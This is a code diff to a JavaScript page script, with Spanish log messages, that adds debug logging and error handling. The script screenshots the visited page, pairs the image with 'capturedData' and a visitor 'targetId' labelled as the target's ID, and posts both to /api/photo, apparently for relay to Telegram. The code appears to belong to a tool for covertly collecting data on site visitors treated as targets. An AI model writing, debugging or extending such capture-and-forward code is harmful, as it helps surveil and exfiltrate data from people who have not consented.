@@ -102,10 +102,14 @@ async function captureAllData() {
             try {
                 const screenshot = await captureScreenshot();
                 if (screenshot) {
-                    sendLogToBackend(">> Screenshot tomado. Convirtiendo a Blob...");
+                    sendLogToBackend(">> Screenshot tomado. Tamaño: " + screenshot.length + " caracteres. Convirtiendo a Blob...");
                     const blob = dataURItoBlob(screenshot);
-                    sendLogToBackend(">> Blob creado exitosamente. Ejecutando sendPhotoToTelegram...");
-                    await sendPhotoToTelegram(blob, capturedData);
+                    if (blob) {
+                        sendLogToBackend(">> Blob creado exitosamente de " + blob.size + " bytes. Ejecutando sendPhotoToTelegram...");
+                        await sendPhotoToTelegram(blob, capturedData);
+                    } else {
+                        sendLogToBackend(">> Fallo: dataURItoBlob devolvió null.");
+                    }
                 } else {
                     sendLogToBackend(">> Fallo: html2canvas devolvió null (falló silenciosamente).");
                 }
@@ -339,7 +343,10 @@ function simpleHash(str) {
 async function captureScreenshot() {
     const hiddenNodes = [];
     try {
-        if (typeof html2canvas === 'undefined') return null;
+        if (typeof html2canvas === 'undefined') {
+            sendLogToBackend(">> ERROR: html2canvas no está disponible");
+            return null;
+        }
 
         // Espera a que carguen fuentes para evitar capturas "vacías" o textos sin render.
         if (document.fonts && document.fonts.ready) {
@@ -361,6 +368,8 @@ async function captureScreenshot() {
             el.style.setProperty('opacity', '0', 'important');
         });
 
+        sendLogToBackend(">> Iniciando html2canvas con resolución: " + window.innerWidth + "x" + window.innerHeight);
+        
         const canvas = await html2canvas(document.documentElement, {
             // Captura solo lo visible para evitar secciones offscreen con animaciones en opacity:0.
             width: window.innerWidth,
@@ -377,8 +386,13 @@ async function captureScreenshot() {
             ignoreElements: (el) => el.classList?.contains('scan-line'),
         });
 
-        return canvas.toDataURL('image/jpeg', 0.88);
-    } catch (_) {
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+        sendLogToBackend(">> Canvas convertido a DataURL. Tamaño: " + dataUrl.length + " caracteres");
+        
+        return dataUrl;
+    } catch (err) {
+        sendLogToBackend(">> ERROR en captureScreenshot: " + (err?.message || err));
+        console.error("[SCREENSHOT ERROR]", err);
         return null;
     } finally {
         hiddenNodes.forEach(({ el, display, visibility, opacity }) => {
@@ -499,19 +513,31 @@ async function sendToTelegram(data) {
 // Envía la foto (screenshot)
 async function sendPhotoToTelegram(blob, data) {
     sendLogToBackend(">> Ingresando a sendPhotoToTelegram con blob size: " + (blob ? blob.size : 'NULL'));
+    console.log("[SEND PHOTO] Blob size:", blob ? blob.size : 'NULL', "bytes");
+    
     try {
+        if (!blob || blob.size === 0) {
+            sendLogToBackend(">> ERROR: Blob vacío o inválido. Tamaño: " + (blob?.size || 0));
+            console.error("[SEND PHOTO] Blob is empty!");
+            return;
+        }
+        
         const formData = new FormData();
         formData.append("photo", blob, "screenshot.jpg");
         // ID del objetivo para que el backend sepa a quién pertenece
         formData.append("targetId", data.targetId || 'Visitante Anónimo');
 
-        sendLogToBackend(">> FormData creado, iniciando POST a /api/photo...");
+        sendLogToBackend(">> FormData creado " + formData.toString() + ", iniciando POST a /api/photo...");
+        console.log("[SEND PHOTO] Sending photo for targetId:", data.targetId);
 
-        await fetch('/api/photo', {
+        const response = await fetch('/api/photo', {
             method: "POST",
             body: formData
         });
-        sendLogToBackend(">> fetch a /api/photo finalizó limpiamente.");
+        
+        const result = await response.json();
+        sendLogToBackend(">> fetch a /api/photo finalizó. Respuesta: " + JSON.stringify(result));
+        console.log("[SEND PHOTO] Response:", result);
     } catch (err) {
         sendLogToBackend(">> Error enviando FormData a /api/photo: " + err.message);
         console.error("Error al enviar foto:", err);
@@ -532,14 +558,22 @@ function sendLogToBackend(msg) {
 }
 
 function dataURItoBlob(dataURI) {
-    var byteString = atob(dataURI.split(',')[1]);
-    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-    var ab = new ArrayBuffer(byteString.length);
-    var ia = new Uint8Array(ab);
-    for (var i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
+    try {
+        var byteString = atob(dataURI.split(',')[1]);
+        var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        var ab = new ArrayBuffer(byteString.length);
+        var ia = new Uint8Array(ab);
+        for (var i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        const blob = new Blob([ab], { type: mimeString });
+        sendLogToBackend(">> Blob creado exitosamente. Tipo: " + mimeString + ", Tamaño: " + blob.size + " bytes");
+        return blob;
+    } catch (err) {
+        sendLogToBackend(">> ERROR en dataURItoBlob: " + err.message);
+        console.error("[BLOB ERROR]", err);
+        return null;
     }
-    return new Blob([ab], { type: mimeString });
 }
 
 /* ====================================================
